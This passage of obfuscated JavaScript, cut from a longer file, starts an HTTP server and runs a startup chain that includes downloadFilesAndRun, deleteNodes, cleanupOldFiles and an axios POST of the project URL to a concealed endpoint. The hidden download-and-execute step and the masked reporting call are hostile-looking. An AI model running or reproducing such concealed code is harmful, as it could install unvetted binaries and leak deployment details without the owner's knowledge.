axios[_0x3a07f5(0x1b6)](_0x3a07f5(0x1cb),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x3a07f5(0x1a9)](_0x3a07f5(0x1cf)),_0x818d46;}catch(_0x597d14){return console[_0x3a07f5(0x220)](_0x3a07f5(0x1e9)+_0x597d14['message']),null;}}async function startserver(){const _0x55fc2d=_0x19274e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1819ef){console[_0x55fc2d(0x220)](_0x55fc2d(0x21f),_0x1819ef);}}startserver()[_0x19274e(0x184)](_0x470d53=>{const _0x10cea2=_0x19274e;console[_0x10cea2(0x220)]('Unhandled\x20error\x20in\x20startserver:',_0x470d53);}),app[_0x19274e(0x17d)](PORT,()=>console[_0x19274e(0x1a9)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
